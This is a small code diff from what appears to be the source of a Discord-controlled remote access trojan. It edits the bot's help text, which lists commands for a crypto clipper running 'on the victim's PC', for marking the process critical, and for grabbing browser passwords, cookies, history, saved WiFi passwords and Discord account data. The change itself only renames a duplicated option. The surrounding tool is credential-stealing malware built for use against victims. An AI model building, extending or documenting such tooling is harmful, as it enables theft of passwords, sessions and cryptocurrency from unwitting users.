@@ -389,7 +389,7 @@ help = {
         'stop-clipper': ['➡️ `.stop-clipper`', 'Stops the Crypto Clipper thread on the victim\'s PC'],
         'set-critical': ['➡️ `.set-critical`', 'Elevates the process to critical status.'],
         'unset-critical': ['➡️ `.unset-critical`', 'Removes the critical status from the process.'],
-        'grab': ['➡️ `.grab <what-to-grab>`', 'Grabs specified information. Options:\n🔹passwords - grabs all browser-saved passwords\n🔹history - grabs the browser history\n🔹cookies - grabs browser-cookies\n🔹wifi - grabs all WiFi saved passwords\n🔹discord - grabs all possible information from victim\'s Discord account\n🔹discord - grabs discord information, passwords & cookies'],
+        'grab': ['➡️ `.grab <what-to-grab>`', 'Grabs specified information. Options:\n🔹passwords - grabs all browser-saved passwords\n🔹history - grabs the browser history\n🔹cookies - grabs browser-cookies\n🔹wifi - grabs all WiFi saved passwords\n🔹discord - grabs all possible information from victim\'s Discord account\n🔹all - grabs discord information, passwords & cookies'],
         'clear': ['➡️ `.clear`', 'Clears all messages on the file-related channel'],
         'pwd': ['➡️ `.pwd`', 'Displays current directory path'],
         'ls': ['➡️ `.ls`', 'Lists current directory content'],
